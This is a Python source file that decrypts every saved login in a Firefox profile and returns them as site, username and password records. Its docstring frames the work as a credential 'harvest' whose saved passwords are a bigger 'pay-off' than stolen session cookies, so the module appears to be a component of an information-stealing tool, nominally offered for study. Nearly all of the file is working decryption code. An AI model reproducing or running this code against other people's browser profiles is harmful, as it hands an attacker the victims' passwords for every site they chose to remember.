"""Firefox saved-login decryption.

logins.json holds hostname + encryptedUsername + encryptedPassword for
every "remember password" entry. The encrypted blobs are base64-encoded
NSS SDR values; decrypting them requires an initialized NSS session
against the SAME profile folder (the decryption key lives in key4.db).

The value of this module for the technique you're studying: it turns the
harvest into full credential pairs (site -> username + password), which is
a much bigger pay-off than cookies alone. But it depends on the user
having chosen "remember password" in Firefox; session cookies exist for
every logged-in site regardless.
"""

from __future__ import annotations

import json
import os
import shutil
import tempfile
from dataclasses import dataclass, field
from typing import Any

from . import nss


@dataclass
class Login:
    hostname: str
    username: str
    password: str
    http_realm: str | None = None
    form_submit_url: str | None = None
    guid: str = ""

    def to_dict(self) -> dict[str, Any]:
        return {
            "hostname": self.hostname,
            "username": self.username,
            "password": self.password,
            "httpRealm": self.http_realm,
            "formSubmitURL": self.form_submit_url,
            "guid": self.guid,
        }


def _load_logins_json(profile_path: str) -> list[dict]:
    """Read logins.json. It is a plain JSON file (values inside are encrypted)."""
    path = os.path.join(profile_path, "logins.json")
    if not os.path.isfile(path):
        backup = os.path.join(profile_path, "logins-backup.json")
        if os.path.isfile(backup):
            path = backup
        else:
            return []
    with open(path, encoding="utf-8") as fh:
        data = json.load(fh)
    return data.get("logins", [])


def dump_logins(profile_path: str, nss_session: nss.NSS) -> list[Login]:
    """Decrypt all saved logins in a profile using the given NSS session.

    encType: 0 = stored in plaintext, 1 = encrypted (the normal case).
    """
    out: list[Login] = []
    for entry in _load_logins_json(profile_path):
        enc_type = entry.get("encType", 1)
        user_enc = entry.get("encryptedUsername", "")
        pass_enc = entry.get("encryptedPassword", "")
        if enc_type:
            try:
                user = nss_session.decrypt(user_enc)
                password = nss_session.decrypt(pass_enc)
            except nss.NSSDecryptError:
                user = "*** decryption failed ***"
                password = "*** decryption failed ***"
        else:
            user, password = user_enc, pass_enc
        out.append(
            Login(
                hostname=entry.get("hostname", ""),
                username=user,
                password=password,
                http_realm=entry.get("httpRealm"),
                form_submit_url=entry.get("formSubmitURL"),
                guid=entry.get("guid", ""),
            )
        )
    return out
